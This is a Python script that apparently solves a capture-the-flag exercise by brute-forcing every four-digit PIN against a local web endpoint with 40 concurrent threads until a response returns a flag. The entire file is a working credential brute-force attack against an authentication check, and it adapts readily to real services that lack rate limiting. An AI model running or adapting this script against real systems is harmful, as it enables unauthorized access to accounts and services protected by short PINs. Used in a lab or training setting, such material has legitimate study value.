import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

ip = "127.0.0.1"
port = 1234

URL = f"http://{ip}:{port}/pin?pin={{}}"

MAX_WORKERS = 40
TIMEOUT = 3

found_event = threading.Event()
print_lock = threading.Lock()

result = {"pin": None, "flag": None}

session = requests.Session()


def try_pin(pin: int):
    if found_event.is_set():
        return None

    formatted_pin = f"{pin:04d}"

    # Progress output (thread-safe)
    with print_lock:
        print(f"[*] Trying PIN: {formatted_pin}")

    try:
        r = session.get(URL.format(formatted_pin), timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            if "flag" in data:
                if not found_event.is_set():
                    found_event.set()
                    result["pin"] = formatted_pin
                    result["flag"] = data["flag"]
                    print(f"[+] FOUND PIN: {formatted_pin}")
                return formatted_pin
    except requests.RequestException:
        pass

    return None


def main():
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(try_pin, pin) for pin in range(10000)]

        for future in as_completed(futures):
            if found_event.is_set():
                break

    if result["pin"]:
        print(f"\nSUCCESS")
        print(f"PIN : {result['pin']}")
        print(f"FLAG: {result['flag']}")
    else:
        print("No PIN found")

# Main
if __name__ == "__main__":
    main()